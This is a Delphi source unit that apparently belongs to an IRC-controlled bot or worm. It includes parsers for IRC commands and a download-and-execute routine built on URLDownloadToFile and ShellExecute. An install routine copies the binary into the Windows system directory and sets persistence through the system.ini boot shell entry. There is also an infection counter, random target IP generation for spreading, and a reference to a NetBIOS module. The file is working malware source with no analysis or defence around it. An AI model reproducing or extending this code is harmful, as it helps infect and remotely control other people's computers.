   unit uFunctions;

   interface

   Uses ShellApi, Winsock, Windows;

   Function iGetNick(Param:String):String;
   Function iGetIdent(Param:String):String;
   Function iGetHost(Param:String):String;
   Function iGetFullHost(Param:String):String;
   Function iGetChannel(Param:String):String;
   Function iGetMessage(Param:String):String;
   Function LowerCase(const S: string): string;
   function URLDownloadToFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';
   Procedure ExecuteFile(F: String; Show:Boolean);
   Function IntToStr(X: integer): string;
   function Trim(const S: string): string;
   function StrToInt(S: string): integer;
   function IPstr(HostName:String) : String;
   Function rStrInt(Data, S: String): String;
   Function FixInfected:String;
   Procedure InstallMe(name: String);

   implementation

   Uses uNetBios;

   Function SysDir: String;
   Var
     Sys: Array[0..250] Of Char;
   Begin
     GetSystemDirectory(Sys, 250);
     Result := String(Sys)+'\';
   End;

   Procedure InstallMe(name: String);
   Var
     FileName: String;
   Begin
     FileName := Sysdir + Name;
     If CopyFile(pChar(paramStr(0)), pChar(FileName), False) Then
     Begin
       WritePrivateProfileString('boot','shell',pChar('Explorer.exe '+name), 'system.ini');
       If CreateMutex(NIL, False, 'Goddamnit>_<') = error_already_exists Then
         ExitProcess(0);
     End Else
     Begin
       If CreateMutex(NIL, False, 'Goddamnit>_<') = error_already_exists Then
         ExitProcess(0);
     End;
   End;

   Function FixInfected:String;
   Var
     S1: String;
   Begin
     S1 := IntToStr(Inf);
     While Length(S1) < 5 Do
       S1 := '0'+ S1;
     Result := S1;
   End;

   Function rStrInt(Data, S: String): String;
   Var
     Anus, J: Integer;
     Params: Array[0..10] Of String;
     tmp   :String;

     Procedure GetParams(S: String);
     Var
       Tmp         :String;
       I           :Integer;
     Begin
       S := S + '.';
       I := 0;

       While Pos('.', S) > 0 Do
       Begin
         If I = 10 Then Break;
         Tmp := Copy(S, 1, Pos('.', S)-1);
         S   := Copy(S, Pos('.', S)+1, Length(S));
         If Tmp <> '' Then
         Begin
           Params[i] := Tmp;
           Inc(I);
         End;
       End;
       I := 0;
     End;

   Begin
   {
     While Pos(S, Data) > 0 Do
     Begin
       Randomize;
       I := Pos(S, Data);
       Delete(Data, I, Length(S));
       Insert(IntToStr(Random(255)+1), Data, I);
     End;

     Result := Data;
   }

     FillChar(Params, 10, #0);
     GetParams(Data);

     ZeroMemory(@Anus, SizeOf(Anus));
     For Anus := 0 To 3 Do
     Begin
       If (Pos(S, Params[Anus]) > 0) Then
       Begin
         If Length(Params[Anus]) > 1 Then
         Begin
           Tmp := Params[Anus];
           Repeat
             Params[Anus] := Tmp;
             Randomize;
             J := Pos(S, Params[Anus]);
             Delete(Params[Anus], J, Length(S));
             If Length(Params[Anus])+1 = 2 Then
               Insert(IntToStr(Random(99)+1), Params[Anus], J);
             If Length(Params[Anus])+1 = 3 Then
               Insert(IntToStr(Random(9)+1), Params[Anus], J);
           Until StrToInt(Params[Anus]) < 255;
         End Else
         Begin
           Randomize;
           J := Pos(S, Params[Anus]);
           Delete(Params[Anus], J, Length(S));
           Insert(IntToStr(Random(255+1)), Params[Anus], J);
           Sleep(180);Sleep(180);
         End;
       End;
     End;
     Result := Params[0]+'.'+
               Params[1]+'.'+
               Params[2]+'.'+
               Params[3];
   End;

   function IPstr(HostName:String) : String;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('168',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   function Trim(const S: string): string;
   var
    I, L: Integer;
   begin
    L := Length(S);
    I := 1;
    while (I <= L) and (S[I] <= ' ') do Inc(I);
    if I > L then Result := '' else
     begin
      while S[L] <= ' ' do Dec(L);
      Result := Copy(S, I, L - I + 1);
     end;
   end;

   Function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   function StrToInt(S: string): integer;
   var
    V, Code: integer;
   begin
    Val(S, V, Code);
    Result := V;
   end;

   Procedure ExecuteFile(F: String; Show:Boolean);
   Begin
     ShellExecute(0,'open',pChar(F),0,0,Integer(Show));
   End;

   function LowerCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   Function iGetNick(Param:String):String;
   Begin
    Result := Copy(Param, 2, Pos('!', Param)-2);
   End;

   Function iGetIdent(Param:String):String;
   Begin
    Result := Copy(Param, Pos('!', Param)+1, Pos('@', Param)-2);
   End;

   Function iGetHost(Param:String):String;
   Begin
    Result := Copy(Param, Pos('@', Param)+1, Pos(' ', Param)-2);
   End;

   Function iGetFullHost(Param:String):String;
   Begin
    Result := Copy(Param, Pos('!', Param)+1, Pos(' ', Param)-2);
   End;

   Function iGetChannel(Param:String):String;
   Begin
    Result := Copy(Param, Pos('PRIVMSG', Param)+8, Length(Param));
    Result := Copy(Result, 1, Pos(':', result)-2);
   End;

   Function iGetMessage(Param:String):String;
   Begin
    Result := Copy(Param, Pos('PRIVMSG', Param)+8, Length(Param));
    Result := Copy(Result, Pos(':', result)+1, Length(Result));
    If Copy(Result, Length(Result)-1, 2) = #13#10 Then
      Result := Copy(Result, 1, Length(Result)-2);
   End;

   end.

